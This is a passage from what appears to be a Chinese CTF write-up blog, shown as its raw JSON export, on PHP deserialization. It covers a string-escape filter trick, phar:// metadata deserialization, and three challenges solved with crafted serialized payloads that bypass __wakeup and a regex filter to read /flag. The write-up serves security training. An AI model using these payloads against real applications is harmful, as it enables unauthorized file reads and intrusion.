&#x27;flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125;&#x27;, 1 =&gt; &#x27;1&#x27;];print_r(waf(serialize($a)));echo &quot;&lt;br&gt;&quot;;print_r(unserialize(waf(serialize($a))));?&gt; 输出结果： 12345678910a:2:&#123;i:0;s:325:&quot;indexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindex&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125;&quot;;i:1;s:1:&quot;1&quot;;&#125;Array( [0] &#x3D;&gt; __PHP_Incomplete_Class Object ( [__PHP_Incomplete_Class_Name] &#x3D;&gt; A [filename] &#x3D;&gt; flag.php )) 1python -c &quot;print(len(&#x27;indexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindex&#x27;))&quot; 输出：325 phar反序列化(不太懂phar反序列化怎么用，这部分摘自https://paper.seebug.org/680/) phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。 注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。 1234567891011121314&lt;?php class TestObject &#123; &#125; @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $o = new TestObject(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt; 可以明显的看到meta-data是以序列化的形式存储的： 有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下： phar_test1.php 12345678910&lt;?php class TestObject &#123; public function __destruct() &#123; echo &#x27;Destruct called&#x27;; &#125; &#125; $filename = &#x27;phar://phar.phar/test.txt&#x27;; file_get_contents($filename); ?&gt; 其他函数当然也是可行的： phar_test2.php 1234567891011&lt;?php class TestObject &#123; public function __destruct() &#123; echo &#x27;Destruct called&#x27;; &#125; &#125; $filename = &#x27;phar://phar.phar/a_random_string&#x27;; file_exists($filename); //...... ?&gt; 当文件系统函数的参数可控时，我们可以在不调用unserialize()的情况下进行反序列化操作，一些之前看起来“人畜无害”的函数也变得“暗藏杀机”，极大的拓展了攻击面。 题目unserialize11234567891011&lt;?php show_source(__FILE__); class XianZhi&#123; public $name; function __destruct()&#123; echo file_get_contents($this-&gt;name); &#125; &#125; unserialize($_GET[&#x27;a&#x27;]);?&gt; 构造序列化代码 12345678&lt;?phpclass XianZhi&#123; public $name = &#x27;/flag&#x27;;&#125;$a = new XianZhi();echo serialize($a);?&gt;//O:7:&quot;XianZhi&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;/flag&quot;;&#125; unserialize2OC绕过、wake up绕过 1234567891011121314151617181920212223242526272829303132&lt;?phpclass Demo &#123; private $file = &#x27;index.php&#x27;; public function __construct($file) &#123; $this-&gt;file = $file; &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123; if ($this-&gt;file != &#x27;index.php&#x27;) &#123; //the secret is in the f15g_1s_here.php $this-&gt;file = &#x27;index.php&#x27;; &#125; &#125;&#125;if (isset($_GET[&#x27;var&#x27;])) &#123; $var = base64_decode($_GET[&#x27;var&#x27;]); if (preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $var)) &#123; die(&#x27;stop hacking!&#x27;); &#125; else &#123; @unserialize($var); &#125;&#125; else &#123; highlight_file(&quot;index.php&quot;);&#125;?&gt; 这里首先有两个要绕过的点 第一个点是__wakeup()，因为这里正常反序列化会写死$this-&gt;ﬁle属性为 index.php，但是php存在这么一个漏洞（CVE-2016-7124），当实际对象不等于反序列化的对象数时候会绕过wakeup()。 第二个点是正则匹配，这里的正则匹配的意思是如果在var变量中存在O/C:数字(O:数字或者C:数字这样的形式)就die掉，这里匹配的是O:4，直接使用+号当做空格即可绕过，即O:+4即可绕过。 构造序列化代码 123456789101112131415&lt;?phpclass Demo &#123; private $file = &#x27;index.php&#x27;; public function __construct($file) &#123; $this-&gt;file = $file; &#125;&#125;$a = new Demo(&#x27;f15g_1s_here.php&#x27;);$a = serialize($a).&quot;\\n&quot;;$a = str_replace(&#x27;O:4&#x27;,&#x27;O:+4&#x27;,$a);$a = str_replace(&#x27;:1:&#x27;,&#x27;:2:&#x27;,$a);echo base64_encode($a);?&gt;//TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQo= unserialize3私有属性绕过 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?phphighlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125;function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; ord() 函数返回字符串的首个字符的 ASCII 值。 file_get_contents() 把整个文件读入一个字符串中。 要利用read()的file_get_contents()读取flag.php，即/flag 所以process()的$op==”2”，然后通过output()输出 1234567891011&lt;?phpclass FileHandler &#123; protected $op = 2; protected $filename = &quot;/flag&quot;; protected $content = &quot;Hello World!&quot;;&#125;$a = new FileHandler;$b = serialize($a);echo $b;?&gt; 把输出的$b适当修改，得到payload 1&#x2F;?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\\00*\\00op&quot;;i:2;S:11:&quot;\\00*\\00filename&quot;;s:5:&quot;&#x2F;flag&quot;;S:10:&quot;\\00*\\00content&quot;;s:12:&quot;Hello%20World!&quot;;&#125;","categories":[{"name":"信息安全","slug":"信息安全","permalink":"https://github.com/flag2020/flag2020.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web","slug":"web","permalink":"https://github.com/flag2020/flag2020.github.io/tags/web/"}]}],"categories":[{"name":"比赛writeup","slug":"比赛writeup","permalink":"https://github.com/flag2020/flag2020.github.io/categories/%E6%AF%94%E8%B5%9Bwriteup/"},{"name":"信息安全","slug":"信息安全","permalink":"https://github.com/flag2020/flag2020.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://github.com/flag2020/flag2020.github.io/tags/writeup/"},{"name":"web","slug":"web","permalink":"https://github.com/flag2020/flag2020.github.io/tags/web/"}]}